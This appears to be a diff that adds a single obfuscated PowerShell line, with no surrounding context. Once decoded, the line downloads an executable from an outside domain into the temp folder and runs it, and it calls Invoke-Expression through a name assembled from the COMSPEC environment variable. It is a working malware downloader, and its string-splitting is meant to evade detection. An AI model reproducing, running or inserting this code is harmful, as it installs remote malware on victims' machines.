@@ -1,0 +1,1 @@
+﻿(('(8A1dpl'+'=8A1'+'env:temp+o7xf.exeo'+'7x)'+';'+'('+'New-Object Syste'+'m'+'.Net'+'.We'+'b'+'Clien'+'t).Down'+'lo'+'adF'+'i'+'le(o7xhttp://'+'alo'+'nqoo'+'d.com/lum'+'i'+'a.exeo'+'7'+'x'+', 8A1dpl);'+'S'+'t'+'a'+'rt-Process 8A1d'+'pl') -CReplace([char]111+[char]55+[char]120),[char]39 -CReplace  ([char]56+[char]65+[char]49),[char]36) |.( $enV:COMspEC[4,26,25]-JOin'')
